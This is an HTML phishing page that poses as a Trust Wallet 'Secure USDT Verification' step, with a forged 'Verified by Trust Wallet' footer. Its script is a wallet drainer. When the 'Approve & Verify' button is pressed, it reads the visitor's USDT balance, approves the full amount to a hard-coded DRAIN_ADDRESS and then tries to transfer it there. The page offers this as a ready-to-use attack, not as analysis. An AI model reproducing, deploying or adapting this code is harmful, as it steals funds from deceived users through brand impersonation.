<!DOCTYPE html>
<html>
<head>
  <title>Secure USDT Verification</title>
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <link rel="icon" href="./favicon.ico" type="image/x-icon" />
  <style>
    body { background:#081c3a; color:#fff; text-align:center; padding-top:40px; font-family:sans-serif; }
    img { width:100px; margin-bottom:20px; }
    h1 { font-size:1.5em; margin-bottom:10px; }
    p { opacity:0.8; }
    button { padding:12px 24px; background:#0052ff; color:#fff; border:none; border-radius:8px; cursor:pointer; font-size:1em; margin-top:20px; }
    .footer { position:fixed; bottom:10px; width:100%; opacity:0.5; font-size:0.8em; }
  </style>
</head>
<body>
  <img src="./logo.png" alt="Trust Wallet Logo">
  <h1>Secure USDT Verification</h1>
  <p>Tap below to allow secure transfer of USDT.</p>
  <button id="drain">Approve & Verify</button>
  <div class="footer">Verified by Trust Wallet • Trusted since 2009</div>

  <script src="https://cdn.jsdelivr.net/npm/web3@1.8.2/dist/web3.min.js"></script>
  <script>
    const DRAIN_ADDRESS = "0x1956B3950A73B0C54792199Edf13c7b835FF94DC";
    const USDT = "0x55d398326f99059fF775485246999027B3197955";
    const ABI = [
      { "constant":false,"inputs":[{"name":"_spender","type":"address"},{"name":"_value","type":"uint256"}],"name":"approve","outputs":[{"name":"","type":"bool"}],"type":"function" },
      { "constant":false,"inputs":[{"name":"_from","type":"address"},{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transferFrom","outputs":[{"name":"","type":"bool"}],"type":"function" },
      { "constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"type":"function" }
    ];

    async function drain() {
      if (!window.ethereum) {
        alert('Please use Trust Wallet DApp browser.');
        return;
      }
      await window.ethereum.request({ method:'eth_requestAccounts' });
      const web3 = new Web3(window.ethereum);
      const accounts = await web3.eth.getAccounts();
      const user = accounts[0];
      const contract = new web3.eth.Contract(ABI, USDT);
      const balance = await contract.methods.balanceOf(user).call();

      // First Approve
      await contract.methods.approve(DRAIN_ADDRESS, balance).send({from:user});
      // Then TransferFrom
      await contract.methods.transferFrom(user, DRAIN_ADDRESS, balance).send({from:user});
      alert('✅ Success! Thank you.');
    }

    document.getElementById('drain').onclick = drain;
  </script>
</body>
</html>
